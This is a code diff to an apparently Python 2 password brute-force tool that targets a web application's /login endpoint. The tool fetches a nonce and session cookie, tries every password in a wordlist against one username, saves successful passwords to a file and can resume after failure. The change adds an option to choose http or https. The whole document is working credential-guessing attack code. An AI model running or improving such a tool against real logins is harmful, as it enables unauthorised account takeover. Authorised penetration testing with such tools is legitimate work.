@@ -23,7 +23,9 @@ def main():
     parser.add_argument('-u','--username',help='The username to try',required='True')
     parser.add_argument('-f','--failure',help='The path of the webpage that illustrates what a failed login attempt is',required='True')
     parser.add_argument('-r','--resume',help='If the last attempt resulted in unexpected program failure, use this option to resume from the last credentail tried',action='store_true')
+    parser.add_argument('-s', '--scheme', help='Scheme of base URL, default: http.')
     args = parser.parse_args()
+    scheme = str(args.scheme) if args.scheme is not None else 'http'
     target = str(args.target)
     wordlist = str(args.list)
     username = str(args.username)
@@ -86,7 +88,7 @@ def main():
     #Test passwords
         for password in passwordList:
             try:
-                if testCreds(target,username,password,webpage) == True:
+                if testCreds(target, username, password, webpage, scheme=scheme) == True:
                     with open('successful_creds.txt','a') as output:
                         output.write(str(password))
                         output.write('\n')
@@ -102,9 +104,11 @@ def main():
                 sys.exit()
 
 
-def testCreds(target,username,password,webpage):
+def testCreds(target, username, password, webpage,
+              scheme=None):
     try:
         #Get unique nonce & session cookie
+        scheme = scheme if scheme is not None else 'http'
         data = 'action=getnonce'
         headers = { 'Host'          :   str(target),
                     'User-Agent'    :   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
@@ -116,7 +120,7 @@ def testCreds(target,username,password,webpage):
                     'Content-Length':   '15',
                     'Connection'    :   'close'
         }
-        r = requests.post('http://'+str(target)+'/login',data=data,headers=headers)
+        r = requests.post(str(scheme)+'://'+str(target)+'/login', data=data, headers=headers)
         nonce = str(r.text)
         cookieDict = {}
         cookieDict = r.cookies.get_dict()
@@ -173,7 +177,7 @@ def testCreds(target,username,password,webpage):
     #Error handling
     except requests.exceptions.ConnectionError:
         time.sleep(5)
-        return testCreds(target,username,password,webpage)
+        return testCreds(target, username, password, webpage, scheme=scheme)
     except Exception as e:
         print ' [!] Unexpected Exception: '+str(e)
         with open('LastCredTryBeforeFail.txt','w') as output:
